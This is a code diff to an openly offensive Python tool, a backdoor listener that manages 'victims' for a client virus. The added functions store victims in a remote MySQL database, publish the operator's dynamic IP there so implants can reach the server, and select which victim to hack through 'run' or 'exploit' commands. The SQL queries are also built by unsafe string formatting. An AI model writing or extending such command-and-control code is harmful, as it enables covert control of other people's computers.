@@ -1,4 +1,4 @@
-
+from requests import get
 from libs.colors import COLORS
 from subprocess import check_output, CalledProcessError, call
 from os import devnull
@@ -16,9 +16,9 @@ global activated_option
 
 def print_backdoor_listener_options(inputs_dict):
     descriptions = {
-        'LPORT':'This is the name of the final executable',
-        'LHOST': 'This is the program ID of the virus',
-        'PID': 'Number of seconds it sleeps during work'
+        'LPORT':'This is the listening port of the server',
+        'LHOST': 'This is the listening IP address of the server',
+        'PID': 'This is the ID of the victims client virus'
     }
 
     print(colors.RESET, end='')
@@ -29,7 +29,7 @@ def print_backdoor_listener_options(inputs_dict):
             table_data.append(single_data)
         except KeyError:
             pass
-        
+
     table = AsciiTable(table_data)
     print(table.table, end='\n\n')
 
@@ -100,6 +100,92 @@ def draw_table(heading, data):
     print(table.table)
 
 
+def add_new_victim():
+    global program_path
+
+    p_id = input('\tInput Program ID ----> ')
+    name = input('\tInput Victim Name ---> ')
+
+    try:
+        credentials = read_credential_file(program_path)
+        sql_database = connect(
+                host     = credentials['Server'],
+                user     = credentials['Username'],
+                passwd   = credentials['Password'],
+                database = credentials['Database'],
+                port     = credentials['Port']
+            )
+
+        print(colors.Green + '[✔]Conncected to the database')
+
+        my_cursor = sql_database.cursor()
+        sql_input_command = "INSERT INTO `users`(`p_id`, `name`, `mac_addr`, `hack`) VALUES({}, '{}', '', 0)".format(p_id, name)
+        my_cursor.execute(sql_input_command)
+        print(colors.Green + '[✔]Victim inserted to the databse\n' + colors.RESET)
+
+        sql_database.commit()
+
+    except Exception as error:
+        print(colors.Red + '[✘]Error occured while inserting please red the error message \n[✘]Error: {}'.format(error) + colors.RESET)
+
+
+def execute_listener(settings):
+    global program_path
+    credentials = read_credential_file(program_path)
+
+    try:
+        # Firstly try to read the public IP address
+        ip = get('https://api.ipify.org').text
+        print(colors.Green + '[✔]Dynamic ip {} found'.format(ip) + colors.RESET)
+
+        try:
+            # Then try to reach the data base and upload it to the base
+            hacker_database = connect(
+                host     = credentials['Server'],
+                user     = credentials['Username'],
+                passwd   = credentials['Password'],
+                database = credentials['Database'],
+                port     = credentials['Port']
+            )
+            my_cursor = hacker_database.cursor()
+            print(colors.Green + '[✔]Reached to database successfully' + colors.RESET)
+
+            ip_insert_command = "UPDATE `ip_addr` SET `ip`='{}' WHERE `id` = 1".format(ip)
+            my_cursor.execute(ip_insert_command)
+            print(colors.Green + '[✔]IP address uploaded successfully' + colors.RESET)
+
+
+            try:
+                # select victim data
+                victim_selection = "SELECT * FROM `users` WHERE `p_id` = {}".format(settings['PID'])
+                my_cursor.execute(victim_selection)
+                victim_data = list(map(list, my_cursor.fetchall()))
+                print(colors.Green + '[✔]Selected victim data downloaded successfully' + colors.RESET)
+
+                # set all victims un selected
+                command = "UPDATE `users` SET `hack` = 0"
+                my_cursor.execute(command)
+                # set selectited vicim selected
+                command = "UPDATE `users` SET `hack` = 1 WHERE `p_id` = {}".format(settings['PID'])
+                my_cursor.execute(command)
+                print(colors.Green + '[✔]Selected victim setteled successfully' + colors.RESET)
+
+                #############################################
+                #############################################
+                ##### PYTHON 2 SERVER INSTANCE RUNS HERE ####
+                #############################################
+                #############################################
+                hacker_database.commit()
+            
+            except Exception as error:
+                print(colors.Red + '[✘]Error occured while setting the victim read error\n[✘]Error: {}'.format(error))
+        except Exception as error:
+            print(colors.Red + '[✘]Error occured while uploading the dynamic IP read the error\n[✘]Error: {}'.format(error) + colors.RESET)
+    except Exception as error:
+        print(colors.Red + '[✘]Error occured while reading dynamic IP read the error\n[✘]Error: {}'.format(error) + colors.RESET)
+
+
+
 def activate_listener():
     # from the begining used command line interface
     global activated_option
@@ -136,15 +222,24 @@ def activate_listener():
         elif command == '' or command == ' ':
             pass
 
+        elif command == 'run' or command == 'exploit':
+            execute_listener(saved_inputs_dict)
+
+        elif command == 'add' or command == 'add victim':
+            add_new_victim()
+
         # if the command is show options then show options
         elif command == 'show options' or command == 'options':
             print_backdoor_listener_options(saved_inputs_dict)
 
         # if the command is set then update the settings wales
         elif command.split()[0] == 'set':
-            setting = command.split()[1]
-            new_value = command.split()[2]
-            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
+            try:
+                setting = command.split()[1]
+                new_value = command.split()[2]
+                saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
+            except IndexError:
+                pass
 
         else:
             print(colors.Red + '[✘]Invalid comand' + colors.RESET)
